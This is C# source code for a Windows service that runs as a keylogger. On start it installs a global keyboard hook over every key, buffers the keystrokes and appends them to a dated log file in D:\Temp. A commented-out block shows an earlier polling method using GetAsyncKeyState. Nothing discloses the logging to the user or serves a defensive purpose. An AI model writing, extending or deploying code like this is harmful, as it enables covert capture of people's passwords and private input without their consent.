using System;
using System.ServiceProcess;
using System.IO;
using System.Threading;
using System.Runtime.InteropServices;
using System.Windows.Forms;


namespace WindowsService1
{
    public partial class Service1 : ServiceBase
    {
        Logger logger;
        public Service1()
        {
            InitializeComponent();
            this.CanStop = true;
            this.CanPauseAndContinue = true;
            this.AutoLog = true;
        }

        protected override void OnStart(string[] args)
        {
            logger = new Logger();
            Thread loggerThread = new Thread(new ThreadStart(logger.Start));
            loggerThread.Start();
        }

        protected override void OnStop()
        {
            logger.Stop();
        }
    }

    class Logger
    {
        bool enabled = true;
       // [DllImport("user32.dll")]
       //public static extern int GetAsyncKeyState(Int32 i);
        StreamWriter writer;
        string Name;
        GlobalKeyboardHook gHook;
        string bufer = "";

        public Logger()
        {
            Name="LOG_";
            string Date=DateTime.Now.ToString("dd/MM/yyyy");
            Name=Name+Date+".txt";
            Name="D:\\Temp\\"+Name;
            writer=new StreamWriter(Name,true);
            string Start = "START " + DateTime.Now.ToString("hh:mm:ss");
            writer.WriteLine(Start);
            writer.Flush();
        }

        public void Start()
        {
            gHook = new GlobalKeyboardHook(); 
            gHook.KeyDown += new KeyEventHandler(gHook_KeyDown);
            foreach (Keys key in Enum.GetValues(typeof(Keys)))
                gHook.HookedKeys.Add(key);
            gHook.hook();
        
         /*  while (enabled)
            {
               
              for (int i = 0; i < 255; i++)
               {
                    int state = GetAsyncKeyState(i);
                    if (state != 0)
                    {
                      bufer += ((Keys)i).ToString(); 
                      if (bufer.Length > 10) 
                      {
                         writer.WriteLine(bufer);
                         writer.Flush();
                         bufer = ""; 
                      }
                    }
               }

            }*/
        }
        
        public void gHook_KeyDown(object sender, KeyEventArgs e)
        {
           bufer += ((char)e.KeyValue).ToString();
           if (bufer.Length > 10)
           {
               writer.WriteLine(bufer);
               writer.Flush();
               bufer = "";
           }
        }

        public void Stop()
        {
            gHook.unhook();
            writer.WriteLine("STOP");
            writer.Flush();
            writer.Close();
            enabled = false;
        }

    }

}